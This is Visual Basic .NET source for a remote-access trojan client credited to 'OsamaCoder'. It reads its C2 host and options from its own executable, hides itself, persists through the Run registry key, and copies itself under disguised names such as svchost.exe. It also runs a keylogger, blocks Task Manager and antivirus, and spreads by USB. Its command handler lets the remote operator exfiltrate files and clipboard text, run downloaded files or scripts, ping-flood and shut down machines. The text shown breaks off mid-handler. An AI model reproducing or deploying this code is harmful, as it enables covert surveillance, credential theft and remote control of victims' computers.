Imports System.Globalization
Imports System.IO
Imports System.Text
Imports System.Net, System.Net.Sockets, System.Threading, System.Runtime.Serialization.Formatters.Binary, System.Runtime.Serialization, System.Runtime.InteropServices, Microsoft.Win32
Imports System.Environment
Imports System.Management, System.CodeDom.Compiler, System.Reflection, System.DirectoryServices, System.IO.File, System.IO.FileStream, System.Runtime.InteropServices.ComTypes, System.Text.RegularExpressions, System.Drawing.Imaging, System.ServiceProcess, System.Net.NetworkInformation, System.Drawing.Drawing2D, Microsoft.VisualBasic.Devices, System.Security.Cryptography

'####################################################################################
'### Coded By Umbrella-Win7 - OsamaCoder#############################################
'### في ذمتك إلين يوم القيامة إذا لم تذكر حقوقي فلن أسامحك إلين يوم القيامة #
'####################################################################################

Public Class Form1

    '####################################################################################
    '### Coded By Umbrella-Win7 - OsamaCoder#############################################
    '### في ذمتك إلين يوم القيامة إذا لم تذكر حقوقي فلن أسامحك إلين يوم القيامة #
    '####################################################################################

    Dim PersistThread As Thread
    Public alab As String
    Public WithEvents C As New SocketClient
    Public Yy As String = "|U|"
    Public HOST As String
    Public port As Integer
    Public name As String
    Public copyse As Boolean = 0
    Public Ver As String = "0.2.6"
    Public virustotal As String = 0
    Dim Devices As Object, Grafikadapter As String, RegionA As String = "SELECT * FROM Win32_VideoController"
    Public task As String = 0
    Public proh As String = 0
    Public avira As String = 0
    Private iwE As String = Environment.GetEnvironmentVariable("windir", EnvironmentVariableTarget.Machine) ' Windows Path


    Public av As String = 0
    Public css, tcs, dta, hidme, melt, temp1, temp2, tr1, sys1, sys2, tr2 As Object
    Const key As String = "pSILlzCez34GFHGHwXBSrQ1Vb72t6bIXyedstKRzAHJklNNL94gD8hIi9FwLiiVlr"


    Public a1 As String = 0
    Public a2 As String = 0
    Public a3 As String = 0
    Public a4 As String = 0
    Public a5 As String = 0
    Public a6 As String = 0
    Public a7 As String = 0
    Public a8 As String = 0
    Public a9 As String = 0


    Public Declare Function SendMessageW Lib "user32.dll" (ByVal hWnd As IntPtr, ByVal Msg As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As IntPtr
    Const TASKBAR_SHOW As Integer = &H40
    Const TASKBAR_HIDE As Integer = &H80
    Private Const SETDESKWALLPAPER = 20
    Private Const UPDATEINIFILE = &H1
    Public tictoc As Integer = 0
    Delegate Sub chatappd(ByVal data1 As String, ByVal data2 As String, ByVal data3 As String)











    Public MutexX As String = "LIUHLIpiuhFRiuhjUFGIRkufhrifUYF"
    Public Priss As String = 0
    Public EXENAME As String = "68465df648rg6684e62dz5d5z8g4tg4t84yj6ki4jr"
    Public AddREg As String = 0
    Public Myinstal As String = "AppData"

    Public Usb11 As String = 0
    Public proz As String = 0
    Public kl As New njLogger
    Dim tt As New AntiTaskManager
    Public us As String = 0
    Public proa As String = 0
    Public proE As String = 0
    Public pror As String = 0
    Private Const SW_SHOWNORMAL As Integer = 1
    Private Const SW_SHOWMINIMIZED As Integer = 2
    Private Declare Function ShowWindow Lib "user32" (ByVal handle As IntPtr, ByVal nCmdShow As Integer) As Integer
    Private Const SW_SHOWMAXIMIZED As Integer = 3
    Public No As String = 0


    Private Declare Function BlockInput Lib "user32" Alias "BlockInput" (ByVal fBlock As Integer) As Integer
    Private Declare Function ShowCursor Lib "user32" (ByVal lShow As Long) As Long ' متغير محفوظ فيه اسم الدوله





    Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer


    Public sernam As String
    Public addtos As Boolean = 0
    Public StartupKey As String
    Public melts As Boolean = 0
    Public pw As String
    Public cap As New CRDP
    Public caa As New CRDP1
    Private culture As String = CultureInfo.CurrentCulture.EnglishName
    Private country As String = culture.Substring(culture.IndexOf("("c) + 1, culture.LastIndexOf(")"c) - culture.IndexOf("("c) - 1)
    Private Declare Function GetForegroundWindow Lib "user32" Alias "GetForegroundWindow" () As IntPtr
    Public Declare Function apiBlockInput Lib "user32" Alias "BlockInput" (ByVal fBlock As Integer) As Integer
    Public Declare Function SwapMouseButton Lib "user32" Alias "SwapMouseButton" (ByVal bSwap As Long) As Long
    Private Declare Auto Sub SendMessage Lib "user32.dll" (ByVal hWnd As Integer, ByVal msg As UInt32, ByVal wParam As UInt32, ByVal lparam As Integer)
    Private Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Integer, ByVal hWndInsertAfter As Integer, ByVal x As Integer, ByVal y As Integer, ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer) As Integer
    Dim taskBar As Integer = FindWindow("Shell_traywnd", "")
    Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Integer

    Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpCommandString As String, ByVal lpReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
    Private Declare Auto Function GetWindowText Lib "user32" (ByVal hWnd As System.IntPtr, ByVal lpString As System.Text.StringBuilder, ByVal cch As Integer) As Integer
    Private makel As String
    Dim alaa(), text1, text2, namev, flder, RG As String
    Const spl = "abccba"
    Dim PictureBox1 As Windows.Forms.PictureBox
    Dim streamWebcam As Boolean = False
    Public loggg As String
    Private Declare Function SendCamMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Int32, ByVal Msg As Int32, ByVal wParam As Int32, <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.AsAny)> ByVal lParam As Object) As Int32
    Public sock As Integer
    Dim id As String = "76487-337-8429955-22614"
    Private pfnStartAddr As Integer
    Public Declare Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" ( _
    ByVal lpLibFileName As String) As Integer

    Public Declare Function GetProcAddress Lib "kernel32" ( _
    ByVal hModule As Integer, ByVal lpProcName As String) As Integer

    Public Declare Function CreateRemoteThread Lib "kernel32" ( _
    ByVal hProcess As Integer, _
    ByVal lpThreadAttributes As Integer, _
    ByVal dwStackSize As Integer, _
    ByVal lpStartAddress As Integer, _
    ByVal lpParameter As Integer, _
    ByVal dwCreationFlags As Integer, _
    ByRef lpThreadId As Integer) As Integer

    Public Structure CLIENT_ID
        Dim UniqueProcess As Long
        Dim UniqueThread As Long
    End Structure
    Private Declare Function RtlCreateUserThread Lib "ntdll.dll" (ByVal hProcess As Long, _
                                                                  ByRef ThreadSecurityDescriptor As Integer, _
                                                                  ByVal CreateSuspended As Long, _
                                                                  ByVal ZeroBits As Long, _
                                                                  ByVal MaximumStackSize As Long, _
                                                                  ByVal CommittedStackSize As Long, _
                                                                  ByVal StartAddress As Long, _
                                                                  ByVal Parameter As Long, _
                                                                  ByRef hThread As Long, _
                                                                  ByRef ClientId As CLIENT_ID) As Long

    Private Function GetCaption() As String
        Dim Caption As New System.Text.StringBuilder(256)
        Dim hWnd As IntPtr = GetForegroundWindow()
        GetWindowText(hWnd, Caption, Caption.Capacity)
        Return Caption.ToString()
    End Function
    Private Sub Form1_FormClosed(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosedEventArgs)
        Process.Start(Application.ExecutablePath)
    End Sub

    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs)
        Process.Start(Application.ExecutablePath)
    End Sub
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
        text1 = Space(LOF(1))
        text2 = Space(LOF(1))
        FileGet(1, text1)
        FileGet(1, text2)
        FileClose()
        alaa = Split(text1, spl)
        HOST = alaa(1)
        port = alaa(2)
        name = alaa(3)
        copyse = alaa(4)
        'serfol = alaa(5)
        sernam = alaa(5)
        addtos = alaa(6)
        StartupKey = alaa(7)
        melts = alaa(8)
        pw = alaa(9)
        task = alaa(10)
        us = alaa(11)
        proE = alaa(12)
        proh = alaa(13)
        proa = alaa(14)
        proz = alaa(15)
        pror = alaa(16)
        virustotal = alaa(17)
        alab = A.GT
        Try
            MutexX = alaa(18)
            Priss = alaa(19)
            EXENAME = alaa(20)
            AddREg = alaa(21)
            Myinstal = alaa(22)
            avira = alaa(23)
            dta = alaa(24)
            css = alaa(25)
            tcs = alaa(26)
            namev = alaa(27)
            flder = alaa(28)
            hidme = alaa(29)
            melt = alaa(30)
            temp1 = alaa(31)
            temp2 = alaa(32)
            tr1 = alaa(33)
            sys1 = alaa(34)
            sys2 = alaa(35)
            tr2 = alaa(36)
            Usb11 = alaa(37)
            a1 = alaa(38)
            a2 = alaa(39)
            a3 = alaa(40)
            a4 = alaa(41)
            a5 = alaa(42)
            a6 = alaa(43)
            av = alaa(44)
            a7 = alaa(45)
            a8 = alaa(46)
            a9 = alaa(47)
        Catch ex As Exception

        End Try


        If Priss Then
            PersistThread = New Thread(AddressOf Persist)
            PersistThread.IsBackground = True : PersistThread.Start(StartupKey)
        End If
        '  MsgBox("MutexX = " + alaa(18) & vbNewLine & "priis = " + alaa(19) & vbNewLine & "exe name = " + alaa(20) & vbNewLine & "add reg= " + alaa(21) & vbNewLine & "my install = " + alaa(22) & vbNewLine, MsgBoxStyle.Critical, "")

        Try
            System.Threading.Mutex.OpenExisting(MutexX) : End
        Catch
            Dim mutex As New Mutex(False, MutexX)
        End Try
        Try
            Dim StartupKey As String = namev
            Dim regKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("software\microsoft\windows\currentversion\run", True)
            regKey.SetValue(StartupKey, Application.ExecutablePath, Microsoft.Win32.RegistryValueKind.String) : regKey.Close()
        Catch : End Try

        Me.FormBorderStyle = Windows.Forms.FormBorderStyle.None
        Me.ShowInTaskbar = False
        Me.Hide()
        Me.Visible = False

        kl.Start()

        name = name & "_" & HWD()

        Timer2.Start()
        '   C.Connect(HOST, port)
        '-----------------------------------------------------------------------------
        If a9 Then
            Timer17.Start()
        End If
        If a8 Then
            Timer16.Start()
        End If
        If a7 Then
            Timer15.Start()
        End If
        If av Then
            AVG()
        End If
        If a1 Then
            Timer9.Start()
        End If
        If a2 Then
            Timer10.Start()
        End If
        If a3 Then
            Timer11.Start()
        End If
        If a4 Then
            Timer12.Start()
        End If
        If a5 Then
            Timer13.Start()
        End If
        If a6 Then
            Timer14.Start()
        End If
        If Usb11 Then
            Timer8.Start()
        End If
        If avira Then
            Dim T As New Threading.Thread(AddressOf BA)
            T.IsBackground = True
            T.Start()
        End If
        If us Then
            Dim usb As New USB
            usb.Start()
        End If
        If virustotal Then
            virustotal1.Block("virustotal")
        End If
        If pror Then
            Timer7.Start()
        End If
        If proh Then
            Timer4.Start()
        End If
        If proz Then
            Timer6.Start()
        End If
        If proa Then
            Timer5.Start()
        End If
        If proE Then
            Timer3.Start()
        End If
        If hidme Then
            File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden)
        End If

        Dim ProgramFiles1 As String = GetFolderPath(SpecialFolder.Programs)
        If sys1 Then
            Directory.CreateDirectory(ProgramFiles1 & "\" & flder)
            If Application.ExecutablePath = Environment.GetFolderPath(Environment.SpecialFolder.Programs) & "\" & flder & "\" & namev Then
                If File.Exists(Path.GetTempPath & "melt.txt") Then
                    '     Try : IO.File.Delete(IO.File.ReadAllText(Path.GetTempPath & "melt.txt")) : Catch : End Try
                End If
            Else
                If File.Exists(Path.GetTempPath & "melt.txt") Then
                    Try : IO.File.Delete(Path.GetTempPath & "melt.txt") : Catch : End Try
                End If
                If File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Programs) & "\" & flder & "\" & namev) Then
                    Try : IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Programs) & "\" & flder & "\" & namev) : Catch : End Try
                    IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Programs) & "\" & flder & "\" & namev)
                    IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Programs) & "\" & flder & "\" & namev)

                Else
                    IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Programs) & "\" & flder & "\" & namev)
                    IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Programs) & "\" & flder & "\" & namev)
                    End
                End If
            End If
        End If
        '------------------------customInstall-----------------------------------------------------------------
        If sys2 Then

            Directory.CreateDirectory(ProgramFiles1 & "\" & tr2)
            If Application.ExecutablePath = Environment.GetFolderPath(Environment.SpecialFolder.Programs) & "\" & tr2 & "\" & namev Then
                If File.Exists(Path.GetTempPath & "melt.txt") Then
                    '  Try : IO.File.Delete(IO.File.ReadAllText(Path.GetTempPath & "melt.txt")) : Catch : End Try
                End If
            Else
                If File.Exists(Path.GetTempPath & "melt.txt") Then
                    Try : IO.File.Delete(Path.GetTempPath & "melt.txt") : Catch : End Try
                End If
                If File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Programs) & "\" & tr2 & "\" & namev) Then
                    Try : IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Programs) & "\" & tr2 & "\" & namev) : Catch : End Try
                    IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Programs) & "\" & tr2 & "\" & namev)
                    IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Programs) & "\" & tr2 & "\" & namev)

                Else
                    IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Programs) & "\" & tr2 & "\" & namev)
                    IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Programs) & "\" & tr2 & "\" & namev)
                    End
                End If
            End If
        End If

        Dim temp As String = GetFolderPath(SpecialFolder.Templates)
        If temp1 Then
            Directory.CreateDirectory(temp & "\" & flder)
            If Application.ExecutablePath = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & flder & "\" & namev Then
                If File.Exists(Path.GetTempPath & "melt.txt") Then
                    '     Try : IO.File.Delete(IO.File.ReadAllText(Path.GetTempPath & "melt.txt")) : Catch : End Try
                End If
            Else
                If File.Exists(Path.GetTempPath & "melt.txt") Then
                    Try : IO.File.Delete(Path.GetTempPath & "melt.txt") : Catch : End Try
                End If
                If File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & flder & "\" & namev) Then
                    Try : IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & flder & "\" & namev) : Catch : End Try
                    IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & flder & "\" & namev)
                    IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & flder & "\" & namev)

                Else
                    IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & flder & "\" & namev)
                    IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & flder & "\" & namev)
                    End
                End If
            End If
        End If
        '------------------------customInstall-----------------------------------------------------------------
        If temp2 Then
            Directory.CreateDirectory(temp & "\" & tr1)
            If Application.ExecutablePath = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & tr1 & "\" & namev Then
                If File.Exists(Path.GetTempPath & "melt.txt") Then
                    '  Try : IO.File.Delete(IO.File.ReadAllText(Path.GetTempPath & "melt.txt")) : Catch : End Try
                End If
            Else
                If File.Exists(Path.GetTempPath & "melt.txt") Then
                    Try : IO.File.Delete(Path.GetTempPath & "melt.txt") : Catch : End Try
                End If
                If File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & tr1 & "\" & namev) Then
                    Try : IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & tr1 & "\" & namev) : Catch : End Try
                    IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & tr1 & "\" & namev)
                    IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & tr1 & "\" & namev)

                Else
                    IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & tr1 & "\" & namev)
                    IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & tr1 & "\" & namev)
                    End
                End If
            End If
        End If

        '----------------appdata-------------Microsoft-----------------------------------------
        Dim appData As String = GetFolderPath(SpecialFolder.ApplicationData)
        If dta Then
            Directory.CreateDirectory(appData & "\" & flder)
            If Application.ExecutablePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & flder & "\" & namev Then
                If File.Exists(Path.GetTempPath & "melt.txt") Then
                    '     Try : IO.File.Delete(IO.File.ReadAllText(Path.GetTempPath & "melt.txt")) : Catch : End Try
                End If
            Else
                If File.Exists(Path.GetTempPath & "melt.txt") Then
                    Try : IO.File.Delete(Path.GetTempPath & "melt.txt") : Catch : End Try
                End If
                If File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & flder & "\" & namev) Then
                    Try : IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & flder & "\" & namev) : Catch : End Try
                    IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & flder & "\" & namev)
                    IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & flder & "\" & namev)

                Else
                    IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & flder & "\" & namev)
                    IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & flder & "\" & namev)
                    End
                End If
            End If
        End If
        '------------------------customInstall-----------------------------------------------------------------
        If css Then
            Directory.CreateDirectory(appData & "\" & tcs)
            If Application.ExecutablePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & tcs & "\" & namev Then
                If File.Exists(Path.GetTempPath & "melt.txt") Then
                    '  Try : IO.File.Delete(IO.File.ReadAllText(Path.GetTempPath & "melt.txt")) : Catch : End Try
                End If
            Else
                If File.Exists(Path.GetTempPath & "melt.txt") Then
                    Try : IO.File.Delete(Path.GetTempPath & "melt.txt") : Catch : End Try
                End If
                If File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & tcs & "\" & namev) Then
                    Try : IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & tcs & "\" & namev) : Catch : End Try
                    IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & tcs & "\" & namev)
                    IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & tcs & "\" & namev)

                Else
                    IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & tcs & "\" & namev)
                    IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & tcs & "\" & namev)
                    End
                End If
            End If
        End If

        If melts Then
            If Application.ExecutablePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe" Then
                If File.Exists(Path.GetTempPath & "melt.txt") Then
                    Try : IO.File.Delete(IO.File.ReadAllText(Path.GetTempPath & "melt.txt")) : Catch : End Try
                End If
            Else

                If File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe") Then
                    Try : IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe") : Catch : End Try
                    IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
                    IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
                    End
                Else
                    IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
                    IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
                    End
                End If
            End If
        End If
        If melt Then
            If File.Exists(Path.GetTempPath & "melt.txt") Then
                Try : IO.File.Delete(IO.File.ReadAllText(Path.GetTempPath & "melt.txt")) : Catch : End Try
            End If
        Else
            If File.Exists(Path.GetTempPath & "melt.txt") Then
                Try : IO.File.Delete(Path.GetTempPath & "melt.txt") : Catch : End Try
            End If

        End If
        '--------------------------------------------------------------------------------
        If copyse Then
            If Application.ExecutablePath = Path.GetTempPath & sernam & ".exe" Then
                If File.Exists(Path.GetTempPath & "melt.txt") Then
                    '   Try : IO.File.Delete(IO.File.ReadAllText(Path.GetTempPath & "melt.txt")) : Catch : End Try
                End If
            Else

                If File.Exists(Path.GetTempPath & sernam & ".exe") Then
                    Try : IO.File.Delete(Path.GetTempPath & sernam & ".exe") : Catch : End Try
                    IO.File.Copy(Application.ExecutablePath, Path.GetTempPath & sernam & ".exe")
                    'IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                    Process.Start(Path.GetTempPath & sernam & ".exe")
                    End
                Else
                    IO.File.Copy(Application.ExecutablePath, Path.GetTempPath & sernam & ".exe")
                    'IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                    Process.Start(Path.GetTempPath & sernam & ".exe")
                    End
                End If
            End If
        End If


        If addtos Then
            Try
                AStartup(StartupKey, Application.ExecutablePath) 'sernam = أ
                Dim startup As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup)
                IO.File.Copy(Application.ExecutablePath, startup & "\" & StartupKey & ".exe") ' تمام  By Mr.Mobark
            Catch : End Try
        End If
        If task Then
            Dim ta As New AntiTaskManager
            Dim st As New Threading.Thread(AddressOf ta.protect)
            st.Start()
        End If
    End Sub
    Public Shared Sub AStartup(ByVal Name As String, ByVal Path As String)
        Dim Registry As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser
        Dim Key As Microsoft.Win32.RegistryKey = Registry.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
        Key.SetValue(Name, Path, Microsoft.Win32.RegistryValueKind.String)
    End Sub
    Public Sub DLV(ByVal n As String) ' delete value in my Registry Key RG
        Try
            Registry.CurrentUser.CreateSubKey("Software\" & RG).DeleteValue(n)
        Catch ex As Exception
        End Try
    End Sub
    Function GTV(ByVal n As String) As String ' Get value in my Registry Key RG
        Try
            Return Registry.CurrentUser.CreateSubKey("Software\" & RG).GetValue(n, "")
        Catch ex As Exception
            Return ""
        End Try
    End Function
    Function STV(ByVal n As String, ByVal t As String) ' set value in my Registry Key RG
        Try
            Registry.CurrentUser.CreateSubKey("Software\" & RG).SetValue(n, t)
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Dim CapTxt As String = GetCaption()
        If makel <> CapTxt Then
            makel = CapTxt
            ' stop timer before showing msgbox so it is not detected!
            Timer1.Stop()
            C.Send("AW" & Yy & CapTxt)
            ' resume timer 
            Timer1.Start()
        End If
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        If C.Statconnected = False Then
            C.Connect(HOST, port)
        End If
    End Sub

#Region "Socket Events"
    Private Sub Connected() Handles C.Connected
        '  Timer2.Stop()
    End Sub
    Private Sub Disconnected() Handles C.Disconnected
        Timer2.Interval = 100
        Timer2.Start()
        C.Connect(HOST, port)
    End Sub
    Private Pro As Object
    Dim Npc = Environment.UserName & "@" & Environment.MachineName
    Private Sub Data(ByVal b As Byte()) Handles C.Data
        Dim T As String = BS(b)
        Dim A As String() = Split(T, Yy)
        Dim x As String = "lv" & Yy
        Try
            Select Case A(0)
                Case "att"
                    Shell("ping -t" & A(1) & "-l " & A(2), AppWinStyle.Hide)
                Case "++"
                    C.Send("++")
                Case "ppww"
                    C.Send("ppww" & Yy & "bb" & alab)
                Case "chat"
                    C.Send("chat" & Yy & Npc)
                Case "recv"
                    Invoke(New oc(AddressOf och))
                    Invoke(New rv(AddressOf rvt), A(1))
                Case "ccl"
                    Invoke(New ec(AddressOf cc))
                Case "closeprocess"
                    Try
                        For Each p As Process In Process.GetProcessesByName(A(1))
                            p.Kill()
                        Next
                    Catch ex As Exception

                    End Try
                Case "r1"
                    Application.Restart()
                    End
                Case "Ren"
                    name = A(1) & "_" & HWD()
                Case "Host"
                    HOST = A(1)
                    port = A(2)
                Case "openurl"
                    System.Diagnostics.Process.Start(A(1))
                Case "newpr"
                    Process.Start(A(1))
                Case "downloadfile"
                    C.Send("downloadedfile" & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(A(1))) & Yy & A(2))
                Case "sendfile"
                    IO.File.WriteAllBytes(IO.Path.GetTempPath & A(1), Convert.FromBase64String(A(2)))
                    Threading.Thread.CurrentThread.Sleep(1000)
                    Process.Start(IO.Path.GetTempPath & A(1))
                Case "sendmusicplay"
                    IO.File.WriteAllBytes(IO.Path.GetTempPath & A(1), Convert.FromBase64String(A(2)))
                    Threading.Thread.Sleep(1000)
                    My.Computer.Audio.Stop()
                    My.Computer.Audio.Play(IO.Path.GetTempPath & A(1), AudioPlayMode.Background)
                Case "script"
                    Dim temp As String = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\tempxxSD"
                    My.Computer.FileSystem.WriteAllText(temp & A(2), A(1), False)
                    Process.Start(temp & A(2))
                Case "ClearClp"
                    My.Computer.Clipboard.Clear()
                Case "SetClp"
                    My.Computer.Clipboard.SetText(A(1))
                Case "GetClp"
                    C.Send("GetClp" & Yy & My.Computer.Clipboard.GetText)
                Case "TextToSpeech"
                    Dim SAPI = CreateObject("SAPI.Spvoice")
                    SAPI.speak(A(1))
                Case "BepX"
                    Beep(A(1), A(2))
                Case "piano"
                    Beep(A(1), 300)
                Case "ErorrMsg"
                    Dim messageicon As MessageBoxIcon
                    Dim messagebutton As MessageBoxButtons
                    Select Case A(1)
                        Case "1"
                            messageicon = MessageBoxIcon.Information
                        Case "2"
                            messageicon = MessageBoxIcon.Question
                        Case "3"
                            messageicon = MessageBoxIcon.Warning
                        Case "4"
                            messageicon = MessageBoxIcon.Error
                    End Select
                    Select Case A(2)
                        Case "1"
                            messagebutton = MessageBoxButtons.YesNo
                        Case "2"
                            messagebutton = MessageBoxButtons.YesNoCancel
                        Case "3"
                            messagebutton = MessageBoxButtons.OK
                        Case "4"
                            messagebutton = MessageBoxButtons.OKCancel
                        Case "5"
                            messagebutton = MessageBoxButtons.RetryCancel
                        Case "6"
                            messagebutton = MessageBoxButtons.AbortRetryIgnore
                    End Select
                    MessageBox.Show(A(4), A(3), messagebutton, messageicon)
                Case "IEhome"
                    AddHome(A(1))
                Case "CursorShow"
                    Cursor.Show()
                Case "CursorHide"
                    Cursor.Hide()
                Case "ClockOFF"
                    hideclock()
                Case "ClockON"
                    showclock()
                Case "TaskbarShow"
                    ShowTaskbarItems()
                Case "TaskbarHide"
                    HideTaskbarItems()
                Case "SoundON"
                    SendMessageW(Process.GetCurrentProcess.Handle, &H319, Process.GetCurrentProcess.Handle, CType(&H80000, IntPtr))
                Case "SoundOFF"
                    SendMessageW(Process.GetCurrentProcess.Handle, &H319, Process.GetCurrentProcess.Handle, CType(&H80000, IntPtr))
                Case "IconsON"
                    IconsToggle()
                Case "IconsOFF"
                    IconsToggle()
                Case "errorsound"
                    My.Computer.Audio.PlaySystemSound(Media.SystemSounds.Asterisk)
                Case "startfun"
                    C.Send("startfun")
                Case "shutdowncomputer"
                    Shell("shutdown -s -t 00", AppWinStyle.Hide)
                Case "restartcomputer"
                    Shell("shutdown -r -t 00", AppWinStyle.Hide)
                Case "logoff"
                    Shell("shutdown -l -t 00", AppWinStyle.Hide)
                Case "blockmouseandkeyboard"
                    BlockInput(1)
                    ShowCursor(0)
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "1", Microsoft.Win32.RegistryValueKind.DWord)
                Case "unblockmouseandkeyboard"
                    BlockInput(0)
                    ShowCursor(1)
                    My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore", "DisableSR", "0", Microsoft.Win32.RegistryValueKind.DWord)
                Case "hidetb"
                    Dim TaskbarHandle As Long
                    TaskbarHandle = FindWindow("Shell_traywnd", "")
                    SetWindowPos(TaskbarHandle, 0&, 0&, 0&, 0&, 0&, TASKBAR_HIDE)
